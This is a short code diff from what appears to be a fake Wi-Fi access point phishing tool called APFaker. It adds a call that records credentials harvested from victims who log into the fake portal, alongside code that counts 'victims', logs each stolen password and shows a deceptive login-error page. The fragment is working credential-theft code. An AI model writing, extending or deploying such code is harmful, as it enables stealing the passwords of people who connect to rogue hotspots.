@@ -209,6 +209,7 @@ void APFakerClientLoopManager(){
           credential.replace("&psw=", ":");
           ResultList[MetricsData[MTR_VICTIMS]] = credential;
           MetricsData[MTR_VICTIMS]++;
+          RecordCredentials(credential);
           Logger::WriteLog(LOG_INFO, "New credential: [" + credential + "]!");
           ProvideErrorPageToClient(client, "We're sorry there was a problem logging in.<br />Try again later or connect to another Access Point among those available.");
           // Siamo spiacenti si è verificato un problema durante il login.<br />Riprovare più tardi o connettersi a un altro Access Point tra quelli disponibili.
